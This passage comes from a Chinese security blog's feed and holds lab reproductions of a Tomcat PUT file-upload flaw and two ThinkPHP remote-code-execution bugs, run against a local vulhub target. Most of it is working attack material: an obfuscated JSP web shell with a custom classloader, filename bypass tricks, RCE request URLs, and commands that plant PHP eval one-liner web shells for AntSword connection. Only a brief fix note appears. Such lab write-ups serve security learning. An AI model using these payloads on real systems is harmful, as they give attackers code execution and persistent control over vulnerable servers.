EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>将生成的木马上传。这里使用&lt;strong>PUT&lt;/strong>方法进行上传，文件名可以是&lt;code>/xxx.jsp/&lt;/code>、&lt;code>/xxx.jsp%20&lt;/code>、&lt;code>/xxx::$DATA&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">PUT /123.jsp/ HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 192.168.197.140:8080
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Accept-Encoding: gzip, deflate, br
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: keep-alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Priority: u=0, i
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Content-Length: 946
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;% String H9991 = request.getParameter(&amp;#34;123&amp;#34;);if (H9991 != null) { class EdnMF480 extends/*Z#гдh*u@!h0S4OG4fI8*/ClassLoader { EdnMF480(ClassLoader L0YKXC) { super(L0YKXC); } public Class H9991(byte[] b) { return super.defineClass(b, 0, b.length);}}byte[] bytes = null;try {int[] aa = new int[]{99, 101, 126, 62, 125, 121, 99, 115, 62, 82, 81, 67, 85, 38, 36, 84, 117, 115, 127, 116, 117, 98}; String ccstr = &amp;#34;&amp;#34;;for (int i = 0; i &amp;lt; aa.length; i++) {aa[i] = aa[i] ^ 16; ccstr = ccstr + (char) aa[i];}Class A001M = Class.forName(ccstr);String k = new String(new byte[]{100,101,99,111,100,101,66,117,102,102,101,114});bytes = (byte[]) A001M.getMethod(k, String.class).invoke(A001M.newInstance(), H9991);}catch (Exception e) {bytes = javax.xml.bind.DatatypeConverter.parseBase64Binary(H9991);}Class aClass = new EdnMF480(Thread.currentThread().getContextClassLoader()).H9991(bytes);Object o = aClass.newInstance();o.equals(pageContext);} else {} %&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133512.png" alt="image.png">&lt;br>
返回&lt;strong>201&lt;/strong>即上传成功，使用蚁剑进行连接&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/123.jsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904133602.png" alt="image.png">&lt;/p>
&lt;h1 id="绕过姿势">绕过姿势&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">1.Windows下不允许文件以空格结尾以
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2.WindowsNTFS流
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Put/a001.jsp::$DATA HTTP/1.1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3. /在文件名中是非法的， 也会被去除（Linux/Windows）
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Put/a001.jsp/http:/1.1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="修复建议">修复建议&lt;/h1>
&lt;p>把readonly 改成true&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;init-param&amp;gt; &amp;lt;param-name&amp;gt;readonly&amp;lt;/param-name&amp;gt; &amp;lt;paramvalue&amp;gt;true&amp;lt;/param-value&amp;gt;&amp;lt;/init-param&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Wed, 03 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B05.0.22-5.1.29%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/30.webp" alt="Featured image of post 【Thinkphp漏洞复现】5.0.22-5.1.29远程代码执行漏洞" />&lt;h1 id="0x00-简介">0x00 简介&lt;/h1>
&lt;p>ThinkPHP(FCS)是一个轻量级的中型框架， 是从Java的Struts结构移植过来的中文PHP开发框架。 它使用面向对象的开发结构和MVC模式， 并且模拟实现了Struts的标签库， 各方面都比较人性化，熟悉J2EE的开发人员相对比较容易上手，适合php框架初学者。ThinkPHP的宗旨是简化开发、 提高效率、 易于扩展， 其在对数据库的支持方面已经包括MySQL、 MSSQL、Sqlite、 PgSQL、Oracle， 以及PDO的支持。 ThinkPHP有着丰富的文档和示例， 框架的兼容性较强， 但是其功能有限，因此更适合用于中小项目的开发。&lt;/p>
&lt;h1 id="0x01-漏洞概述">0x01 漏洞概述&lt;/h1>
&lt;p>ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞， 该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤。 远程攻击者可通过输入‘＼ ’字符的方式调用任意方法利用该漏洞执行代码。&lt;/p>
&lt;h1 id="0x02-影响版本">0x02 影响版本&lt;/h1>
&lt;p>thinkphp 5.0.x&lt;br>
thinkphp 5.1.x&lt;/p>
&lt;h1 id="0x03-环境搭建">0x03 环境搭建&lt;/h1>
&lt;h2 id="1-在docker容器里搭建环境">1、 在docker容器里搭建环境&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/thinkphp/5-rce/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="2-进入目录下-启动环境">2、 进入目录下， 启动环境&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="3-查看环境端口">3、 查看环境端口&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">docker ps -a
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这里我使用的是我自己的Ubuntu系统搭建的。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125256.png" alt="image.png">&lt;br>
直接访问以下链接即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125352.png" alt="image.png">&lt;/p>
&lt;h1 id="0x04-验证方式">0x04 验证方式&lt;/h1>
&lt;p>GET方式尝试命令执行，具体请求如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">197.140&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">think&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">call_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125633.png" alt="image.png">&lt;/p>
&lt;h1 id="0x05-利用方式">0x05 利用方式&lt;/h1>
&lt;h2 id="1url编码一句话木马内容">1、URL编码一句话木马内容：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="2-直接访问连接">2. 直接访问连接：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">197.140&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>\&lt;span class="n">think&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">call_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Fphp&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">40&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="n">_POST&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="n">B&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="n">D&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Eshell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125935.png" alt="image.png">&lt;/p>
&lt;h2 id="3-上传一句话木马">3. 上传一句话木马:&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">webshell地址：http://192.168.197.140:8080/shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">password：x
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="4-连接成功">4. 连接成功！！！&lt;/h2>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903130030.png" alt="image.png">&lt;/p></description></item><item><title>【Thinkphp漏洞复现】ThinkPHP 2.x-任意代码执行</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link><pubDate>Tue, 02 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid><description>&lt;img src="http://localhost:1313/images/29.webp" alt="Featured image of post 【Thinkphp漏洞复现】ThinkPHP 2.x-任意代码执行" />&lt;h1 id="0x00-实验环境">0x00 实验环境&lt;/h1>
&lt;p>攻击机：Win 11&lt;br>
靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）&lt;br>
vulhub靶场下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://vulhub.org/zh#/environments/thinkphp/2-rce/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>部署：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/thinkphp/2-rce
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134038.png" alt="image.png">&lt;/p>
&lt;h1 id="0x01-影响版本">0x01 影响版本&lt;/h1>
&lt;p>&lt;strong>标志&lt;/strong>：/index.php&lt;br>
&lt;strong>版本&lt;/strong>：thinkphp2.x&lt;br>
&lt;strong>简介&lt;/strong>：在ThinkPHP 2.x版本中，使用preg_replace的&lt;code>/e&lt;/code>模式匹配路由：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">$&lt;/span>&lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;@(\w+)&amp;#39;&lt;/span>&lt;span class="o">.$&lt;/span>&lt;span class="n">depr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;([^&amp;#39;&lt;/span>&lt;span class="o">.$&lt;/span>&lt;span class="n">depr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;\/]+)@e&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;$var[&lt;/span>&lt;span class="se">\&amp;#39;\\&lt;/span>&lt;span class="s1">1&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">]=&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">2&amp;#34;;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">implode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">depr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">paths&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞&lt;br>
大体说的还是因为php版本在&lt;strong>5.6.29&lt;/strong>以下时都是支持该函数执行中间的命令的，可到了&lt;strong>7.x&lt;/strong>就不支持了。简单来讲就是&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">preg_replace(&amp;#39;正则规则&amp;#39;,&amp;#39;替换字符&amp;#39;,&amp;#39;目标字符&amp;#39;)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>e&lt;/strong> 配合函数&lt;strong>preg_replace()使用&lt;/strong>, 可以把匹配来的字符串当作正则表达式执行;&lt;br>
&lt;strong>/e&lt;/strong> 可执行模式，此为PHP专有参数，例如preg_replace函数。&lt;br>
例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;?php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">@preg_replace(&amp;#39;/test/e&amp;#39;,&amp;#39;print_r(&amp;#34;AAA&amp;#34;);&amp;#39;,&amp;#39;just test&amp;#39;);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。&lt;/p>
&lt;h1 id="0x02-漏洞复现">0x02 漏洞复现&lt;/h1>
&lt;p>注：复现是比较简单的，原理需要自己去深入剖析&lt;br>
（1）访问页面&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134411.png" alt="image.png">&lt;br>
（2）使用报错爆出thinkphp的版本2.1：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/index.php/111
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134632.png" alt="image.png">&lt;br>
 （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件&amp;lt;=php5.6.29，下面这个版本是满足条件的：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134623.png" alt="image.png">&lt;br>
（4）漏洞利用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134735.png" alt="image.png">&lt;br>
（5）传马，使用以下语句（类似于在该页面写入了一句话木马）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>菜刀与蚁剑均能连接：&lt;br>
蚁剑连接：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135056.png" alt="image.png">&lt;br>
